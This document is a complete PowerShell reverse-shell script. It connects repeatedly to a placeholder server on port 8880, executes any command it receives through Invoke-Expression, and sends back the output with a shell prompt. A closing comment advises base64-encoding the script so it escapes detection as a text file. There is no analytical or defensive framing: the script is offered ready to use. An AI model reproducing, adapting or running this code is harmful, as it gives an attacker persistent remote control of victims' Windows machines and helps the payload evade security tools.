#credit to whoe made this
while($true){try{$c=New-Object System.Net.Sockets.TCPClient("your server",8880);$s=$c.GetStream();$nl=[Environment]::NewLine;$m=[System.Text.Encoding]::UTF8.GetBytes('asprsh'+$nl+'{"a":"a"}'+$nl);$s.Write($m,0,$m.Length);$s.Flush();[byte[]]$b=0..65535|%{0};while($true){if(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$ec=@("exit","quit","bye","logout","close");if($d -in $ec){break;}else{$g=(iex $d 2>&1 | Out-String);$w=$g+$nl+"PS "+(pwd).Path+"# ";$p=([text.encoding]::ASCII).GetBytes($w);$s.Write($p,0,$p.Length);$s.Flush();}}};$c.Close();}catch{Start-Sleep -Seconds 2;};}

#it is recommanded to make this as base64 using powershell itself (do not put it in .txt file)
